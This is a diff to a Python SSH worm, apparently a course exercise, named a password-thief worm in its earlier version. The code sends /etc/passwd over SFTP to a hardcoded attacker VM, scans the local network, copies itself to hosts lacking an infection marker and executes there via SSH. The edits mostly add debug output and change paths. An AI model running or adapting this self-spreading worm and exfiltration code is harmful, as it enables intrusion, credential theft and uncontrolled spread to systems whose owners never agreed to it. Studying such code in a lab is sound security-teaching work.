@@ -21,11 +21,15 @@ def copyPasswd():
 	sshClient = paramiko.SSHClient()
 	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	
-	# hardcoded attacker vm ip, change to match your attacker ip
+	print("Connecting to attacker VM.")
+	
+	# Hardcoded attacker VM IP-Address. (Change to match your attacker VM IP-Address)
 	sshClient.connect("192.168.1.5", username="cpsc", password="cpsc")
 	
+	print("Sending passwd file to attacker VM.")
+	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("/etc/passwd", "/tmp/passwd_" + getMyIP())
+	sftpClient.put("/etc/passwd", "/etc/passwd_" + getMyIP())
 
 ##################################################################
 # Returns whether the worm should spread
@@ -64,9 +68,9 @@ def markInfected():
 def spreadAndExecute(sshClient):
 	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("passwordthief_worm.py", "/tmp/passwordthief_worm.py")
-	sshClient.exec_command("chmod a+x /tmp/passwordthief_worm.py")
-	sshClient.exec_command("python /tmp/passwordthief_worm.py")
+	sftpClient.put("worm.py", "/tmp/worm.py")
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
+	sshClient.exec_command("python /tmp/worm.py 2> errors.txt")
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -232,7 +236,7 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice.
-	if isInfectedSystem(): 
+	if isInfectedSystem() == True: 
 		sys.exit()
 	else:
 		markInfected()
@@ -242,6 +246,8 @@ if len(sys.argv) < 2:
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
+print(getMyIP())
+print(networkHosts)
 networkHosts.remove(getMyIP())
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
@@ -266,13 +272,16 @@ for host in networkHosts:
 		
 		try:
 			remotepath = '/tmp/infected.txt'
-			localpath = '/home/cpsc/'
+			localpath = os.getenv("HOME") + '/infected.txt'
 			sftp = sshInfo[0].open_sftp()
 			sftp.get(remotepath, localpath)
 
-		except IOError:
+		except IOError, e:
+			print e
+			print "Attacking: ", host
 			print "This system should be infected"
 			spreadAndExecute(sshInfo[0])
+			sys.exit()
 
 		# TODO: Check if the system was	
 		# already infected. This can be
@@ -304,5 +313,4 @@ for host in networkHosts:
 				
 		print "Spreading complete"	
 	
-
 
